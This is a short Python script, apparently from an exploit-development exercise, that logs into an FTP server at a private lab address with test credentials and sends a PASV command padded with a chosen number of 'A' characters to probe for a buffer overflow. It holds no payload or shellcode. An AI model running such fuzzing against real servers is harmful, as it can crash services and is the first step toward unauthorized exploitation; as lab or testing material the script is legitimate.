#!/usr/bin/python
import socket
import os
import sys

fuzzing_value=int(sys.argv[1])

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect(("192.168.1.99", 21))
response = s.recv(1024)
print(response)

s.send("USER test\r\n")
response = s.recv(1024)
print(response)

s.send("PASS test\r\n")
response = s.recv(1024)
print(response)

s.send("PASV " + "A" * fuzzing_value + "\r\n")
response = s.recv(1024)
print(response)

s.close()
